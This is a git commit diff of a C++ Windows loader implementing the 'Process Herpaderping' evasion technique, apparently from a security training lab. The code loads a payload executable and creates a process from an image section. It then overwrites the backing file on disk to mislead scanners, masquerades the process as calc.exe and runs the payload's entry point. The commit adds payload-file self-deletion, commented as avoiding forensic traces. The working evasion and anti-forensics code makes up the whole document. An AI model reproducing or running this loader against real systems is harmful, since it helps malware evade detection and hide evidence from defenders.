bafa2cf49d11d6d543eb5f66ea969663951ece07
Quang Minh Trần <minhtran6464.lhp@gmail.com>
2025-12-30 02:39:27 +0700

    Herpaderping

--- CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp
+++ CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp
@@ -2,36 +2,47 @@
 #include <stdio.h>
 #include "CWLInc.h"
 
-
-BYTE* GetPayloadBuffer(OUT size_t& p_size) {
+BYTE *GetPayloadBuffer(OUT size_t &p_size)
+{
 	HANDLE hFile = CreateFileW(L"C:\\temp\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hFile == INVALID_HANDLE_VALUE) {
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
 		perror("[-] Unable to open payload file... \n");
 	}
 	p_size = GetFileSize(hFile, NULL);
-	BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (bufferAddress == NULL) {
+	BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (bufferAddress == NULL)
+	{
 		perror("[-] Failed to allocate memory for payload buffer.. \n");
 		exit(-1);
 	}
-	DWORD bytesRead = 0; 
-	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
+	DWORD bytesRead = 0;
+	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL))
+	{
 		perror("[-] Failed to read payload buffer... \n");
 		exit(-1);
 	}
 	CloseHandle(hFile);
+	// Self-delete payload file after reading to avoid forensic traces
+	if (!DeleteFileW(L"C:\\temp\\payload64.exe"))
+	{
+		wprintf(L"[-] Warning: Failed to delete payload file: %d\n", GetLastError());
+	}
 	return bufferAddress;
 }
 
-ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload,PROCESS_BASIC_INFORMATION pbi) {
+ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE *payload, PROCESS_BASIC_INFORMATION pbi)
+{
 	// Functions Declaration
 	_RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
-	if (pRtlImageNtHeader == NULL) {
+	if (pRtlImageNtHeader == NULL)
+	{
 		perror("[-] Couldn't found API RtlImageNTHeader...\n");
 		exit(-1);
 	}
 	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
-	if (pNtReadVirtualMemory == NULL) {
+	if (pNtReadVirtualMemory == NULL)
+	{
 		perror("[-] Couldn't found API NtReadVirtualMemory...\n");
 		exit(-1);
 	}
@@ -42,7 +53,8 @@ ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload,PROCESS_BASIC_INFORMATION
 	NTSTATUS status;
 	ZeroMemory(image, sizeof(image));
 	status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
-	if (!NT_SUCCESS(status)) {
+	if (!NT_SUCCESS(status))
+	{
 		perror("[-] Error reading process base address..\n");
 		exit(-1);
 	}
@@ -53,46 +65,54 @@ ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload,PROCESS_BASIC_INFORMATION
 	return entryPoint;
 }
 
-
-BOOL Herpaderping(BYTE* payload,size_t payloadSize) {
+BOOL Herpaderping(BYTE *payload, size_t payloadSize)
+{
 	// Functions Declartion
 	_NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
-	if (pNtCreateSection == NULL) {
+	if (pNtCreateSection == NULL)
+	{
 		perror("[-] Couldn't find API NtCreateSection...\n");
 		exit(-1);
 	}
 	_NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
-	if (pNtCreateProcessEx == NULL) {
+	if (pNtCreateProcessEx == NULL)
+	{
 		perror("[-] Couldn't find API NtCreateProcessEx...\n");
 		exit(-1);
 	}
 	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
-	if (pNtQueryInformationProcess == NULL) {
+	if (pNtQueryInformationProcess == NULL)
+	{
 		perror("[-] Couldn't find API NtQueryInformationProcess...\n");
 		exit(-1);
 	}
 	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
-	if (pNtCreateThreadEx == NULL) {
+	if (pNtCreateThreadEx == NULL)
+	{
 		perror("[-] Couldn't find API NtCreateThreadEx\n");
 		exit(-1);
 	}
 	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
-	if (pRtlCreateProcessParametersEx == NULL) {
+	if (pRtlCreateProcessParametersEx == NULL)
+	{
 		perror("[-] Couldn't find API RtlCreateProcessParametersEx\n");
 		exit(-1);
 	}
 	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
-	if (pRtlInitUnicodeString == NULL) {
+	if (pRtlInitUnicodeString == NULL)
+	{
 		perror("[-] Couldn't find API RtlInitUnicodeString \n");
 		exit(-1);
 	}
 	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
-	if (pNtWriteVirtualMemory == NULL) {
+	if (pNtWriteVirtualMemory == NULL)
+	{
 		perror("[-] Couldn't find API NtWriteVirtualMemory\n");
 		exit(-1);
 	}
 	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
-	if (pNtAllocateVirtualMemory == NULL) {
+	if (pNtAllocateVirtualMemory == NULL)
+	{
 		perror("[-] Couldn't find API NtAllocateVirtualMemory...");
 		exit(-1);
 	}
@@ -102,7 +122,7 @@ BOOL Herpaderping(BYTE* payload,size_t payloadSize) {
 	HANDLE hThread;
 	NTSTATUS status;
 	PROCESS_BASIC_INFORMATION pbi;
-	PEB* remotePEB;
+	PEB *remotePEB;
 	DWORD bytesWritten;
 	signed int bufferSize;
 	ULONG_PTR entryPoint;
@@ -110,32 +130,33 @@ BOOL Herpaderping(BYTE* payload,size_t payloadSize) {
 	UNICODE_STRING uDllPath;
 	PRTL_USER_PROCESS_PARAMETERS processParameters;
 
-
 	wchar_t tempFile[MAX_PATH] = {0};
-	wchar_t tempPath[MAX_PATH] = { 0 };
+	wchar_t tempPath[MAX_PATH] = {0};
 	GetTempPathW(MAX_PATH, tempPath);
 	GetTempFileNameW(tempPath, L"HD", 0, tempFile);
 	wprintf(L"[+] Creating temp file: %s\n", tempFile);
 	// Create a temp File
-	// later this file holds our payload 
-	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, 
-					FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
-	if (hTemp == INVALID_HANDLE_VALUE) {
+	// later this file holds our payload
+	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
+						FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
+	if (hTemp == INVALID_HANDLE_VALUE)
+	{
 		perror("[-] Unable to create temp file....\n");
 		exit(-1);
 	}
 	// Write Payload into the temp file
-	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL)) {
+	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL))
+	{
 		perror("[-] Unable to write payload to the file...\n");
 		exit(-1);
 	}
 	wprintf(L"[+] Payload written into the temp file...\n");
 
-
 	// CreateSection with temp file
 	// SEC_IMAGE flag is set
 	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTemp);
-	if (!NT_SUCCESS(status)) {
+	if (!NT_SUCCESS(status))
+	{
 		perror("[-] Unable to create section from temp file...\n");
 		exit(-1);
 	}
@@ -143,68 +164,72 @@ BOOL Herpaderping(BYTE* payload,size_t payloadSize) {
 
 	// Create Process with section
 	status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(),
-						PS_INHERIT_HANDLES , hSection, NULL, NULL, FALSE);
-	if (!NT_SUCCESS(status)) {
+								PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+	if (!NT_SUCCESS(status))
+	{
 		perror("[-] Unable to create process... \n");
 		exit(-1);
 	}
 
-
 	wprintf(L"[+] Spawned the process from the created section...\n");
 	// Get remote process information
 	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
-	if (!NT_SUCCESS(status)) {
+	if (!NT_SUCCESS(status))
+	{
 		perror("[-] Unable to Get Process Information...\n");
 		exit(-1);
 	}
 	// Get the entry point
 	entryPoint = GetEntryPoint(hProcess, payload, pbi);
 
-
 	// Modify the file on disk
 	SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
 	bufferSize = GetFileSize(hTemp, 0);
 	bufferSize = 0x1000;
 	wchar_t bytesToWrite[] = L"Hello From CyberWarFare Labs\n";
-	while (bufferSize > 0) {
+	while (bufferSize > 0)
+	{
 		WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
 		bufferSize -= bytesWritten;
 	}
 	wprintf(L"[+] Modified temp file on the disk...\n");
 
-
 	// Set Process Parameters
 	wprintf(L"[+] Crafting process parameters...\n");
-	wchar_t targetFilePath[MAX_PATH] = { 0 };
+	wchar_t targetFilePath[MAX_PATH] = {0};
 	lstrcpy(targetFilePath, L"C:\\Windows\\System32\\calc.exe");
 	pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);
 	wchar_t dllDir[] = L"C:\\Windows\\System32";
-	UNICODE_STRING uDllDir = { 0 };
+	UNICODE_STRING uDllDir = {0};
 	pRtlInitUnicodeString(&uDllPath, dllDir);
 	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
-		NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
-	if (!NT_SUCCESS(status)) {
+										   NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+	if (!NT_SUCCESS(status))
+	{
 		perror("Unable to create process parameters.. \n");
 		exit(-1);
 	}
 
 	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
 	PVOID paramBuffer = processParameters;
-	status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize, 
-			MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (!NT_SUCCESS(status)) {
+	status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize,
+									  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!NT_SUCCESS(status))
+	{
 		perror("Unable to allocate memory for process parameters.. \n");
 		exit(-1);
 	}
 	status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
-		processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
-	if (!NT_SUCCESS(status)) {
+								   processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
+	if (!NT_SUCCESS(status))
+	{
 		perror("Failed to write process parameters in target process.. \n");
 		exit(-1);
 	}
 	// Getting Remote PEB address
-	remotePEB = (PEB*)pbi.PebBaseAddress;
-	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) {
+	remotePEB = (PEB *)pbi.PebBaseAddress;
+	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL))
+	{
 		perror("Failed to update process parameters address.. \n");
 		exit(-1);
 	}
@@ -212,9 +237,10 @@ BOOL Herpaderping(BYTE* payload,size_t payloadSize) {
 
 	// Create and resume thread
 	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
-		(LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
+							   (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
 	wprintf(L"[+] Thread executed...\n");
-	if (!NT_SUCCESS(status)) {
+	if (!NT_SUCCESS(status))
+	{
 		perror("Unable to start thread.. \n");
 		exit(-1);
 	}
@@ -222,10 +248,9 @@ BOOL Herpaderping(BYTE* payload,size_t payloadSize) {
 	return TRUE;
 }
 
-
-int main() {
+int main()
+{
 	size_t payloadSize;
-	BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
+	BYTE *payloadBuffer = GetPayloadBuffer(payloadSize);
 	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);
-	
 }
